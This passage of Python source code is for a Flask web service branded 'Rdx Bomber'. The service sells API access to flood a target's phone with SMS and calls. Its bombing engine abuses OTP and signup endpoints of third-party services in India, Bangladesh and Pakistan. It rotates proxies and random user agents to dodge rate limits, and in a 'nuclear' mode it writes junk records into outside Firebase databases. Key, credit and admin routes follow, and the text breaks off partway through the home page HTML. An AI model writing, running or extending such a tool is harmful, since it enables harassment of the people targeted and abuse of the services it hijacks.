    def _fire(_):
        try:
            proxy = get_proxy()
            r = requests.get(url, proxies=proxy, headers={"User-Agent": _ua()}, timeout=20, verify=False)
            return r.status_code in (200, 201, 202, 204)
        except: return False
    n = PROXY_MULTIPLIER
    with ThreadPoolExecutor(max_workers=min(n, 20)) as pool:
        results = list(pool.map(_fire, range(n)))
    return sum(1 for r in results if r), n

# ═══════════════════════════════════════════════════════════════
#  PAKISTAN APIs
# ═══════════════════════════════════════════════════════════════
PAK_SMS_APIS = [
    {"name": "MainAPI",
     "url_fn": lambda p, c=10: f"https://smsbomberapi-ruby.vercel.app/api/send?phone={p}&count={c}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "LystnFM",
     "url": "https://www.lystn.fm/snippets/auth.php",
     "method": "POST",
     "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"type=getotp&mobile={p}&isdCode=92"},
    {"name": "SmsBmb",
     "url": "https://sms-bmb-api.fakcloud.tech/",
     "method": "POST",
     "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","count":10}}'},
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 12; OnePlus 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/117.0.5938.108 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Xiaomi 13 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
]

# ═══════════════════════════════════════════════════════════════
#  PROXY UTILITIES
# ═══════════════════════════════════════════════════════════════
_proxies: list = []
_proxy_idx = 0
_proxy_lock = threading.Lock()

def _parse_proxy_lines(lines: list) -> list:
    result = []
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"): continue
        parts = line.split(":")
        if len(parts) == 4:
            ip, port, user, pw = parts
            proxy_url = f"http://{user}:{pw}@{ip}:{port}"
        else:
            proxy_url = f"http://{line}"
        result.append({"http": proxy_url, "https": proxy_url})
    return result

def load_proxies():
    global _proxies
    if not USE_PROXY: return
    proxy_env = os.environ.get("PROXY_LIST", "").strip()
    if proxy_env:
        lines = re.split(r'[\n,;]+', proxy_env)
        _proxies = _parse_proxy_lines(lines)
        print(f"✅ Loaded {len(_proxies)} proxies from PROXY_LIST env var")
        return
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE) as f:
            lines = f.readlines()
        _proxies = _parse_proxy_lines(lines)
        print(f"✅ Loaded {len(_proxies)} proxies from {PROXY_FILE}")
        return
    print("⚠️  No proxies loaded — running without proxy rotation")

def get_proxy():
    global _proxy_idx
    if not USE_PROXY or not _proxies: return None
    with _proxy_lock:
        p = _proxies[_proxy_idx % len(_proxies)]
        _proxy_idx += 1
        return p

def _ua():
    return random.choice(USER_AGENTS)

# ═══════════════════════════════════════════════════════════════
#  FIREBASE HELPERS
# ═══════════════════════════════════════════════════════════════
def fb_get_user(uid):
    if not _db: return None
    try:
        doc = _db.collection("users").document(str(uid)).get()
        return doc.to_dict() if doc.exists else None
    except: return None

def fb_set_user(uid, data):
    if not _db: return False
    try:
        _db.collection("users").document(str(uid)).set(data, merge=True)
        return True
    except: return False

def fb_update_user(uid, **kwargs):
    if not _db: return False
    try:
        _db.collection("users").document(str(uid)).update(kwargs)
        return True
    except: return False

def fb_all_users(limit=500):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("users").limit(limit).stream()]
    except: return []

def fb_get_key_by_key(key):
    if not _db: return None
    try:
        doc = _db.collection("keys").document(key).get()
        return doc.to_dict() if doc.exists else None
    except: return None

def fb_set_key(key, data):
    if not _db: return False
    try:
        _db.collection("keys").document(key).set(data)
        return True
    except: return False

def fb_update_key(key, **kwargs):
    if not _db: return False
    try:
        _db.collection("keys").document(key).update(kwargs)
        return True
    except: return False

def fb_all_keys(limit=200):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("keys")
                .order_by("created_at", direction=firestore.Query.DESCENDING).limit(limit).stream()]
    except: return []

def fb_all_channels():
    if not _db: return []
    try:
        return [dict(d.to_dict(), id=d.id) for d in _db.collection("channels").stream()]
    except: return []

def fb_add_channel(chat_id, title, link):
    if not _db: return False
    try:
        _db.collection("channels").document(str(chat_id)).set({
            "chat_id": str(chat_id), "title": title, "link": link,
            "added_at": int(time.time())
        })
        sq_upsert_channel(chat_id, title, link)
        return True
    except: return False

def fb_del_channel(chat_id):
    if not _db: return False
    try:
        _db.collection("channels").document(str(chat_id)).delete()
        sq_del_channel(chat_id)
        return True
    except: return False

def fb_get_setting(k, default=None):
    if not _db: return default
    try:
        doc = _db.collection("settings").document(k).get()
        return doc.to_dict().get("v") if doc.exists else default
    except: return default

def fb_set_setting(k, v):
    if not _db: return False
    try:
        _db.collection("settings").document(k).set({"v": str(v)})
        sq_set_setting(k, v)
        return True
    except: return False

def fb_all_gifts(limit=100):
    if not _db: return []
    try:
        return [d.to_dict() for d in _db.collection("gift_codes")
                .order_by("created_at", direction=firestore.Query.DESCENDING).limit(limit).stream()]
    except: return []

def fb_set_gift(code, data):
    if not _db: return False
    try:
        _db.collection("gift_codes").document(code).set(data)
        return True
    except: return False

def fb_del_gift(code):
    if not _db: return False
    try:
        _db.collection("gift_codes").document(code).delete()
        return True
    except: return False

def fb_usage_today(key):
    if not _db: return sq_usage_today(key)
    try:
        today = time.strftime("%Y-%m-%d", time.gmtime())
        doc = _db.collection("usage").document(f"{key}_{today}").get()
        return doc.to_dict().get("count", 0) if doc.exists else 0
    except: return 0

def fb_incr_usage(key):
    sq_count = sq_incr_usage(key)
    if not _db: return sq_count
    try:
        today = time.strftime("%Y-%m-%d", time.gmtime())
        ref = _db.collection("usage").document(f"{key}_{today}")
        ref.set({"key": key, "day": today, "count": firestore.Increment(1)}, merge=True)
        doc = ref.get()
        return doc.to_dict().get("count", 1) if doc.exists else 1
    except: return sq_count

def daily_limit():
    try: return int(fb_get_setting("daily_limit", API_DAILY_LIMIT) or sq_get_setting("daily_limit", API_DAILY_LIMIT))
    except: return API_DAILY_LIMIT

def validate_key(key):
    if not key: return False, 401, "API key required"
    row = fb_get_key_by_key(key)
    if not row: row = sq_get_key(key)
    if not row: return False, 401, "Invalid API key"
    if row.get("revoked"): return False, 403, "Key revoked"
    if row.get("expires_at", 0) <= int(time.time()): return False, 401, "Key expired"
    u = fb_get_user(row.get("user_id", ""))
    if not u: u = sq_get_user(row.get("user_id", ""))
    if u and u.get("banned"): return False, 403, "Account banned"
    limit = row.get("daily_limit") or daily_limit()
    count = fb_incr_usage(key)
    if count > limit: return False, 429, f"Daily limit reached ({limit}/day)"
    return True, 200, "ok"

# ═══════════════════════════════════════════════════════════════
#  BOMBING ENGINE
# ═══════════════════════════════════════════════════════════════
def _call_api(api: dict, number: str) -> bool:
    try:
        proxy  = get_proxy()
        hdrs   = dict(api.get("headers") or {})
        hdrs.setdefault("User-Agent", _ua())
        method = (api.get("method") or "POST").upper()
        if "url_fn" in api and callable(api["url_fn"]):
            url = api["url_fn"](number)
        else:
            url = api.get("url", "")
        if method == "GET":
            r = requests.get(url, headers=hdrs, proxies=proxy, timeout=8, verify=False)
        else:
            raw_data = api.get("data")
            body = raw_data(number) if callable(raw_data) else (raw_data or "")
            r = requests.post(url, data=body, headers=hdrs, proxies=proxy, timeout=8, verify=False)
        return r.status_code in (200, 201, 202, 204)
    except: return False

def _bomb_apis(apis: list, number: str, limit: int = 0, workers: int = 20) -> tuple:
    if not apis: return 0, 0
    selected = apis[:limit] if limit > 0 else apis
    n = PROXY_MULTIPLIER
    success = 0
    total_calls = len(selected) * n
    with ThreadPoolExecutor(max_workers=min(workers * n, 100)) as pool:
        futures = []
        for api in selected:
            for _ in range(n):
                futures.append(pool.submit(_call_api, api, number))
        for f in as_completed(futures):
            try:
                if f.result(): success += 1
            except: pass
    return success, total_calls

def _bomb_firebase_rtdb(db_urls: list, number: str, limit: int = 0) -> int:
    targets = db_urls[:limit] if limit > 0 else db_urls
    success = 0
    def _write(db_url):
        rand_id = secrets.token_hex(8)
        paths = [
            f"{db_url}/users/{rand_id}/phone.json",
            f"{db_url}/otp/{rand_id}.json",
            f"{db_url}/leads/{rand_id}.json",
        ]
        payload = json.dumps({
            "phone": number, "mobile": number,
            "phoneNumber": number, "timestamp": int(time.time()),
        })
        hdrs = {"Content-Type": "application/json", "User-Agent": _ua()}
        for path in paths:
            try:
                r = requests.put(path, data=payload, headers=hdrs, timeout=6, verify=False)
                if r.status_code in (200, 201): return True
            except: pass
        return False
    with ThreadPoolExecutor(max_workers=min(16, len(targets))) as pool:
        futures = [pool.submit(_write, url) for url in targets]
        for f in as_completed(futures):
            try:
                if f.result(): success += 1
            except: pass
    return success

def _bomb_custom_india(number: str, count: int = 10) -> tuple:
    names = ["Rahul","Priya","Amit","Sneha","Vijay","Pooja","Suresh","Neha","Deepak","Anjali","Ravi","Kavita","Arun","Sunita","Manoj"]
    msgs  = ["RdxVerify","BombTest","OTPTest","RdxAPI","VerifyNow","TestMsg","Register","SignUp","RdxBot","BomberTest"]
    total = count * PROXY_MULTIPLIER
    def _fire(_):
        try:
            result = custom_sms_india(number, random.choice(names), random.choice(msgs))
            return bool(result and result.get("status") is not False)
        except: return False
    with ThreadPoolExecutor(max_workers=min(total, 20)) as pool:
        results = list(pool.map(_fire, range(total)))
    return sum(1 for r in results if r), total

def bomb_india(number: str, mode: str) -> dict:
    sms_ok = sms_total = fb_ok = fb_total = custom_ok = custom_total = 0
    if mode in ("sms", "nuclear"):
        sms_ok, sms_total = _bomb_apis(INDIA_SMS_APIS, number, limit=0)
    if mode == "custom":
        custom_ok, custom_total = _bomb_custom_india(number, count=15)
    if mode == "nuclear":
        fb_ok    = _bomb_firebase_rtdb(INDIA_FIREBASE_DBS, number, limit=0)
        fb_total = len(INDIA_FIREBASE_DBS)
        c_ok, c_total = _bomb_custom_india(number, count=20)
        custom_ok   += c_ok
        custom_total += c_total
    return {
        "country": "india", "mode": mode, "number": number,
        "sms_sent": sms_ok, "sms_total": sms_total,
        "custom_sent": custom_ok, "custom_total": custom_total,
        "firebase_sent": fb_ok, "firebase_total": fb_total,
        "total_sent": sms_ok + fb_ok + custom_ok,
        "sent": sms_ok + fb_ok + custom_ok,
        "total_apis": sms_total + fb_total + custom_total,
        "multiplier": PROXY_MULTIPLIER,
    }

def bomb_bangladesh(number: str, mode: str) -> dict:
    limit_map = {
        "sms": CREDITS_SMS_BOMB, "call": CREDITS_CALL_BOMB,
        "mixed": CREDITS_MIXED_BOMB_BD, "nuclear": CREDITS_NUCLEAR_BD,
    }
    limit = limit_map.get(mode, CREDITS_SMS_BOMB)
    sms_ok = sms_total = call_ok = call_total = 0
    if mode == "sms":
        sms_ok, sms_total = _bd_fire(number, "sms", limit)
    elif mode == "call":
        call_ok, call_total = _bd_fire(number, "call", limit)
    elif mode == "mixed":
        sms_ok, sms_total   = _bd_fire(number, "sms", limit)
        call_ok, call_total = _bd_fire(number, "call", limit)
    elif mode == "nuclear":
        both_ok, both_total = _bd_fire(number, "both", limit)
        sms_ok = both_ok; sms_total = both_total
        s_ok, s_total = _bd_fire(number, "sms", limit)
        c_ok, c_total = _bd_fire(number, "call", limit)
        sms_ok += s_ok; sms_total += s_total
        call_ok += c_ok; call_total += c_total
    total = sms_ok + call_ok
    return {
        "country": "bangladesh", "mode": mode, "number": number,
        "bd_phone": _normalize_bd_phone(number), "limit": limit,
        "sms_sent": sms_ok, "sms_total": sms_total,
        "call_sent": call_ok, "call_total": call_total,
        "total_sent": total or sms_ok, "sent": total or sms_ok,
        "total_apis": sms_total + call_total, "multiplier": PROXY_MULTIPLIER,
    }

def bomb_pakistan(number: str) -> dict:
    ok, total = _bomb_apis(PAK_SMS_APIS, number, limit=0)
    return {
        "country": "pakistan", "mode": "sms", "number": number,
        "sms_sent": ok, "sms_total": total,
        "total_sent": ok, "sent": ok, "total_apis": total, "multiplier": PROXY_MULTIPLIER,
    }

# ═══════════════════════════════════════════════════════════════
#  FLASK APP
# ═══════════════════════════════════════════════════════════════
app = Flask(__name__)
app.secret_key = SECRET_KEY
app.json.sort_keys = False
admin_tokens: set = set()

def require_auth(f):
    @wraps(f)
    def wrapper(*a, **kw):
        token = request.headers.get("X-Admin-Token") or flask_session.get("admin_token")
        if not token or token not in admin_tokens:
            if request.path.startswith("/admin/api/"):
                return jsonify({"error": "Unauthorized"}), 401
            return redirect("/admin/login")
        return f(*a, **kw)
    return wrapper

def _get_key():
    if not REQUIRE_API_KEY: return True, 200, "ok"
    key = (request.headers.get("X-API-Key")
           or request.args.get("key")
           or (request.get_json(silent=True) or {}).get("key", ""))
    return validate_key(key.strip())

def _get_number():
    return (request.args.get("number")
            or (request.get_json(silent=True) or {}).get("number", "")).strip()

def _maintenance_check():
    if MAINTENANCE_MODE or sq_get_setting("maintenance", "0") == "1":
        return jsonify({"status": False, "message": "🔧 Maintenance mode — back soon"}), 503
    return None

# ═══════════════════════════════════════════════════════════════
#  BOMB ENDPOINTS
# ═══════════════════════════════════════════════════════════════
@app.route("/ind", methods=["GET", "POST"])
def api_ind():
    chk = _maintenance_check()
    if chk: return chk
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
    if not _check_rate(ip):
        return jsonify({"status": False, "message": "Rate limit exceeded. Try again later."}), 429
    ok, code, msg = _get_key()
    if not ok: return jsonify({"status": False, "message": msg}), code
    number = _get_number()
    if not number or len(number) < 10:
        return jsonify({"status": False, "message": "Invalid number"}), 400
    mode = (request.args.get("mode") or request.args.get("type") or "sms").lower()
    tier_map = {"normal": "sms", "premium": "custom", "nuclear": "nuclear"}
    mode = tier_map.get(mode, mode)
    if mode not in ("sms", "custom", "nuclear"): mode = "sms"
    result = bomb_india(number, mode)
    sq_log_bomb(request.args.get("key",""), "india", mode, number, result["sent"], result["total_apis"])
    return jsonify({"status": True, **result})

@app.route("/bd", methods=["GET", "POST"])
def api_bd():
    chk = _maintenance_check()
    if chk: return chk
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
    if not _check_rate(ip):
        return jsonify({"status": False, "message": "Rate limit exceeded. Try again later."}), 429
    ok, code, msg = _get_key()
    if not ok: return jsonify({"status": False, "message": msg}), code
    number = _get_number()
    if not number or len(number) < 9:
        return jsonify({"status": False, "message": "Invalid number"}), 400
    mode = (request.args.get("mode") or request.args.get("type") or "sms").lower()
    tier_map = {"normal": "sms", "premium": "mixed", "nuclear": "nuclear"}
    mode = tier_map.get(mode, mode)
    if mode not in ("sms", "call", "mixed", "nuclear"): mode = "sms"
    result = bomb_bangladesh(number, mode)
    sq_log_bomb(request.args.get("key",""), "bangladesh", mode, number, result["sent"], result["total_apis"])
    return jsonify({"status": True, **result})

@app.route("/pak", methods=["GET", "POST"])
def api_pak():
    chk = _maintenance_check()
    if chk: return chk
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
    if not _check_rate(ip):
        return jsonify({"status": False, "message": "Rate limit exceeded. Try again later."}), 429
    ok, code, msg = _get_key()
    if not ok: return jsonify({"status": False, "message": msg}), code
    number = _get_number()
    if not number or len(number) < 10:
        return jsonify({"status": False, "message": "Invalid number"}), 400
    result = bomb_pakistan(number)
    sq_log_bomb(request.args.get("key",""), "pakistan", "sms", number, result["sent"], result["total_apis"])
    return jsonify({"status": True, **result})

@app.route("/status")
def status():
    users = fb_all_users(5000) or sq_all_users(5000)
    bombs = sum(u.get("total_bombs", 0) for u in users)
    return jsonify({
        "status": True, "developer": DEVELOPER, "version": "3.0",
        "users": len(users), "bombs": bombs,
        "india_sms_apis": len(INDIA_SMS_APIS),
        "india_firebase_dbs": len(INDIA_FIREBASE_DBS),
        "bd_api": "single-url (sms|call|both)",
        "pak_sms_apis": len(PAK_SMS_APIS),
        "proxy_multiplier": PROXY_MULTIPLIER,
        "proxies_loaded": len(_proxies),
        "maintenance": MAINTENANCE_MODE or sq_get_setting("maintenance", "0") == "1",
    })

@app.route("/health")
def health():
    """New: lightweight health-check endpoint for uptime monitors."""
    return jsonify({"ok": True, "ts": int(time.time())}), 200

@app.route("/")
def home():
    return render_template_string(HOME_HTML,
        BOT_USERNAME=BOT_USERNAME,
        DEVELOPER_URL=DEVELOPER_URL,
        DEVELOPER=DEVELOPER,
        PROXY_MULTIPLIER=PROXY_MULTIPLIER,
        INDIA_API_COUNT=len(INDIA_SMS_APIS),
        FIREBASE_COUNT=len(INDIA_FIREBASE_DBS),
        PAK_API_COUNT=len(PAK_SMS_APIS),
        BASE_URL=BASE_URL,
    )

# ═══════════════════════════════════════════════════════════════
#  ADMIN ROUTES
# ═══════════════════════════════════════════════════════════════
@app.route("/admin")
@app.route("/admin/")
@app.route("/admin/login")
def admin_index():
    return render_template_string(ADMIN_HTML)

@app.route("/admin/api/login", methods=["POST"])
def admin_login():
    d = request.get_json(silent=True) or {}
    if d.get("password") != ADMIN_PASSWORD:
        return jsonify({"error": "Invalid password"}), 401
    token = secrets.token_hex(32)
    admin_tokens.add(token)
    threading.Timer(86400, lambda: admin_tokens.discard(token)).start()
    return jsonify({"token": token})

@app.route("/admin/api/stats")
@require_auth
def admin_stats():
    users = fb_all_users(5000) or sq_all_users(5000)
    keys  = fb_all_keys(5000)
    now   = int(time.time())
    day0  = now - 86400
    return jsonify({
        "users": len(users),
        "new24": sum(1 for u in users if u.get("joined_at", 0) > day0),
        "banned": sum(1 for u in users if u.get("banned")),
        "keys": sum(1 for k in keys if k.get("expires_at", 0) > now and not k.get("revoked")),
        "bombs": sum(u.get("total_bombs", 0) for u in users),
        "channels": len(fb_all_channels() or sq_all_channels()),
        "india_sms_apis": len(INDIA_SMS_APIS),
        "india_firebase_dbs": len(INDIA_FIREBASE_DBS),
        "bd_api": "Rdx-bd (sms|call|both)",
        "pak_sms_apis": len(PAK_SMS_APIS),
        "premium": sum(1 for u in users if u.get("is_premium")),
        "total_credits": sum(u.get("credits", 0) for u in users),
        "proxy_multiplier": PROXY_MULTIPLIER,
        "proxies": len(_proxies),
        "firebase": bool(_db),
        "daily_limit": daily_limit(),
        "maintenance": sq_get_setting("maintenance", "0") == "1",
        "version": "3.0",
    })

@app.route("/admin/api/users")
@require_auth
def admin_users():
    users = fb_all_users(500) or sq_all_users(500)
    return jsonify(users)

@app.route("/admin/api/users/<uid>/ban", methods=["POST"])
@require_auth
def admin_ban(uid):
    fb_update_user(uid, banned=True)
    sq_update_user(uid, banned=1)
    return jsonify({"success": True})

@app.route("/admin/api/users/<uid>/unban", methods=["POST"])
@require_auth
def admin_unban(uid):
    fb_update_user(uid, banned=False)
    sq_update_user(uid, banned=0)
    return jsonify({"success": True})

@app.route("/admin/api/users/<uid>/credits", methods=["POST"])
@require_auth
def admin_credits(uid):
    d   = request.get_json(silent=True) or {}
    amt = int(d.get("amount", 0))
    if _db:
        _db.collection("users").document(str(uid)).set(
            {"credits": firestore.Increment(amt)}, merge=True)
    sq_incr_user(uid, "credits", amt)
    return jsonify({"success": True, "added": amt})

@app.route("/admin/api/users/<uid>/premium", methods=["POST"])
@require_auth
def admin_premium(uid):
    d = request.get_json(silent=True) or {}
    val = bool(d.get("premium", True))
    fb_update_user(uid, is_premium=val)
    sq_update_user(uid, is_premium=1 if val else 0)
    return jsonify({"success": True})

@app.route("/admin/api/channels")
@require_auth
def admin_channels():
    return jsonify(fb_all_channels() or sq_all_channels())

@app.route("/admin/api/channels", methods=["POST"])
@require_auth
def admin_add_channel():
    d = request.get_json(silent=True) or {}
    chat_id = d.get("chat_id", "").strip()
    title   = d.get("title", "").strip()
    link    = d.get("link", "").strip()
    if not chat_id: return jsonify({"error": "chat_id required"}), 400
    fb_add_channel(chat_id, title, link)
    return jsonify({"success": True})

@app.route("/admin/api/channels/<chat_id>", methods=["DELETE"])
@require_auth
def admin_del_channel(chat_id):
    fb_del_channel(chat_id)
    return jsonify({"success": True})

@app.route("/admin/api/keys")
@require_auth
def admin_keys():
    return jsonify(fb_all_keys(100))

@app.route("/admin/api/keys", methods=["POST"])
@require_auth
def admin_gen_key():
    d    = request.get_json(silent=True) or {}
    uid  = str(d.get("user_id", ""))
    days = int(d.get("days", 30))
    u = fb_get_user(uid)
    if not u: u = sq_get_user(uid)
    if not u: return jsonify({"error": "User not found"}), 404
    key = f"EXO-{secrets.token_hex(12).upper()}"
    exp = int(time.time()) + days * 86400
    kdata = {
        "key": key, "user_id": uid,
        "created_at": int(time.time()),
        "expires_at": exp, "revoked": False,
        "daily_limit": daily_limit(), "plan": f"Admin {days}d",
    }
    fb_set_key(key, kdata)
    sq_upsert_key(key, {**kdata, "revoked": 0})
    return jsonify({"success": True, "key": key, "expires_at": exp})

@app.route("/admin/api/keys/<key>", methods=["DELETE"])
@require_auth
def admin_revoke_key(key):
    fb_update_key(key, revoked=True)
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute("UPDATE api_keys SET revoked=1 WHERE key=?", (key,))
            conn.commit()
        finally: conn.close()
    return jsonify({"success": True})

@app.route("/admin/api/gift")
@require_auth
def admin_gift_list():
    return jsonify(fb_all_gifts(100))

@app.route("/admin/api/gift", methods=["POST"])
@require_auth
def admin_gift_create():
    d          = request.get_json(silent=True) or {}
    credits    = int(d.get("credits", 0))
    max_users  = int(d.get("max_users", 0))
    days_valid = int(d.get("days_valid", 7))
    is_premium = bool(d.get("is_premium", False))
    if credits <= 0: return jsonify({"error": "credits must be > 0"}), 400
    code = "EXO-GIFT-" + secrets.token_hex(4).upper()
    exp  = int(time.time()) + days_valid * 86400 if days_valid > 0 else 0
    gdata = {
        "code": code, "credits": credits, "max_users": max_users,
        "claimed_count": 0, "expires_at": exp,
        "created_at": int(time.time()), "is_premium": is_premium,
    }
    fb_set_gift(code, gdata)
    return jsonify({"success": True, "code": code, "credits": credits,
                    "max_users": max_users, "expires_at": exp})

@app.route("/admin/api/gift/<code>", methods=["DELETE"])
@require_auth
def admin_gift_delete(code):
    fb_del_gift(code)
    return jsonify({"success": True})

@app.route("/admin/api/export")
@require_auth
def admin_export():
    users = fb_all_users(5000) or sq_all_users(5000)
    return jsonify({
        "users": users,
        "keys": fb_all_keys(5000),
        "gifts": fb_all_gifts(5000),
        "channels": fb_all_channels() or sq_all_channels(),
        "exported_at": datetime.now(timezone.utc).isoformat(),
        "version": "3.0",
    })

@app.route("/admin/api/import", methods=["POST"])
@require_auth
def admin_import():
    d = request.get_json(silent=True) or {}
    users = d.get("users", [])
    if users:
        sq_import_users(users)
        for u in users:
            if "id" in u: fb_set_user(u["id"], u)
    return jsonify({"success": True, "imported": len(users)})

@app.route("/admin/api/settings")
@require_auth
def admin_settings_get():
    return jsonify({
        "daily_limit": daily_limit(),
        "proxy_multiplier": PROXY_MULTIPLIER,
        "maintenance": sq_get_setting("maintenance", "0") == "1",
        "rate_limit_max": RATE_LIMIT_MAX,
        "rate_limit_window": RATE_LIMIT_WINDOW,
    })

@app.route("/admin/api/settings", methods=["POST"])
@require_auth
def admin_settings_set():
    d = request.get_json(silent=True) or {}
    if "daily_limit" in d:
        fb_set_setting("daily_limit", int(d["daily_limit"]))
    if "maintenance" in d:
        sq_set_setting("maintenance", "1" if d["maintenance"] else "0")
        fb_set_setting("maintenance", "1" if d["maintenance"] else "0")
    return jsonify({"success": True})

@app.route("/admin/api/proxies")
@require_auth
def admin_proxies():
    """New: return loaded proxy list info."""
    return jsonify({
        "count": len(_proxies),
        "enabled": USE_PROXY,
        "multiplier": PROXY_MULTIPLIER,
        "sample": [str(p.get("http", ""))[:40] + "…" for p in _proxies[:5]],
    })

@app.route("/admin/api/bomb-log")
@require_auth
def admin_bomb_log():
    """New: recent bomb activity log."""
    return jsonify(sq_recent_bombs(100))

# ═══════════════════════════════════════════════════════════════
#  HOME PAGE  — dark glass redesign
# ═══════════════════════════════════════════════════════════════
HOME_HTML = """<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Rdx Bomber — API</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
<style>
:root{
  --bg:#060810;--surface:rgba(255,255,255,.04);--surface2:rgba(255,255,255,.07);
  --border:rgba(255,255,255,.08);--border2:rgba(255,255,255,.14);
  --purple:#8b5cf6;--cyan:#06b6d4;--pink:#ec4899;--green:#10b981;--red:#f43f5e;
  --text:#e2e8f0;--muted:#64748b;--dim:#94a3b8;
  --glow-p:rgba(139,92,246,.25);--glow-c:rgba(6,182,212,.2);
}
*{margin:0;padding:0;box-sizing:border-box}
html{scroll-behavior:smooth}
body{font-family:'Inter',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;overflow-x:hidden}

/* animated bg */
body::before{
  content:'';position:fixed;inset:0;z-index:-1;
  background:
    radial-gradient(ellipse 60% 40% at 20% 10%,rgba(139,92,246,.12) 0%,transparent 60%),
    radial-gradient(ellipse 50% 50% at 80% 80%,rgba(6,182,212,.1) 0%,transparent 60%),
    radial-gradient(ellipse 40% 30% at 60% 30%,rgba(236,72,153,.06) 0%,transparent 50%);
}

.wrap{max-width:960px;margin:0 auto;padding:2rem 1.25rem 5rem}

/* NAV */
nav{display:flex;align-items:center;justify-content:space-between;padding:1.25rem 0 2rem;border-bottom:1px solid var(--border);margin-bottom:3rem}
.nav-logo{display:flex;align-items:center;gap:.6rem;font-weight:800;font-size:1.1rem}
.nav-logo-icon{width:34px;height:34px;border-radius:.5rem;background:linear-gradient(135deg,var(--purple),var(--cyan));display:grid;place-items:center;font-size:1rem;box-shadow:0 0 20px var(--glow-p)}
.nav-links{display:flex;gap:.5rem}
.nav-link{padding:.45rem .9rem;border-radius:.45rem;font-size:.8rem;font-weight:600;text-decoration:none;border:1px solid var(--border);color:var(--dim);transition:all .2s}
.nav-link:hover,.nav-link.active{background:var(--surface2);border-color:var(--border2);color:var(--text)}

/* HERO */
.hero{text-align:center;padding:1rem 0 3.5rem}
.hero-badge{display:inline-flex;align-items:center;gap:.4rem;padding:.35rem .8rem;background:rgba(139,92,246,.12);border:1px solid rgba(139,92,246,.25);border-radius:2rem;font-size:.72rem;font-weight:600;color:var(--purple);letter-spacing:.06em;text-transform:uppercase;margin-bottom:1.5rem}
.hero-badge span{width:6px;height:6px;background:var(--purple);border-radius:50%;animation:pulse 1.8s infinite}
@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.4;transform:scale(.6)}}
.hero-title{font-size:clamp(2.4rem,7vw,4.2rem);font-weight:900;line-height:1.1;margin-bottom:1rem}
.hero-title .g{background:linear-gradient(90deg,var(--purple),var(--cyan),var(--pink));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.hero-sub{color:var(--muted);font-size:.9rem;max-width:480px;margin:0 auto 2rem;line-height:1.6}
.hero-cta{display:flex;gap:.75rem;justify-content:center;flex-wrap:wrap}
.btn{display:inline-flex;align-items:center;gap:.45rem;padding:.75rem 1.6rem;border-radius:.6rem;font-weight:700;font-size:.88rem;text-decoration:none;border:none;cursor:pointer;transition:all .2s;letter-spacing:.01em}
.btn-primary{background:linear-gradient(135deg,var(--purple),var(--cyan));color:#fff;box-shadow:0 0 28px var(--glow-p)}
.btn-primary:hover{transform:translateY(-2px);box-shadow:0 0 40px var(--glow-p)}
.btn-ghost{background:var(--surface);border:1px solid var(--border2);color:var(--text)}
.btn-ghost:hover{background:var(--surface2)}

/* STATS STRIP */
.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:.75rem;margin-bottom:3rem}
.stat{background:var(--surface);border:1px solid var(--border);border-radius:.85rem;padding:1.1rem 1rem;text-align:center;position:relative;overflow:hidden;transition:border-color .3s}
.stat:hover{border-color:var(--border2)}
.stat::after{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(139,92,246,.05),transparent);pointer-events:none}
.stat-v{font-size:1.6rem;font-weight:900;font-family:'JetBrains Mono',monospace;background:linear-gradient(90deg,var(--purple),var(--cyan));-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
.stat-l{font-size:.65rem;color:var(--muted);text-transform:uppercase;letter-spacing:.1em;margin-top:.2rem;font-weight:600}

/* ENDPOINT CARDS */
.section-title{font-size:.7rem;text-transform:uppercase;letter-spacing:.15em;color:var(--muted);font-weight:700;margin-bottom:1rem}
.endpoints{display:flex;flex-direction:column;gap:.75rem;margin-bottom:3rem}
.ep-card{background:var(--surface);border:1px solid var(--border);border-radius:.85rem;padding:1.25rem 1.4rem;display:grid;gap:.6rem;transition:all .25s;cursor:default}
.ep-card:hover{border-color:var(--border2);background:var(--surface2)}
.ep-header{display:flex;align-items:center;gap:.7rem}
.ep-flag{font-size:1.3rem;line-height:1}
.ep-name{font-weight:800;font-size:.95rem}
.ep-modes{display:flex;gap:.35rem;flex-wrap:wrap}
.mode-tag{font-size:.68rem;font-weight:700;padding:.2rem .5rem;border-radius:.3rem;letter-spacing:.05em;text-transform:uppercase}
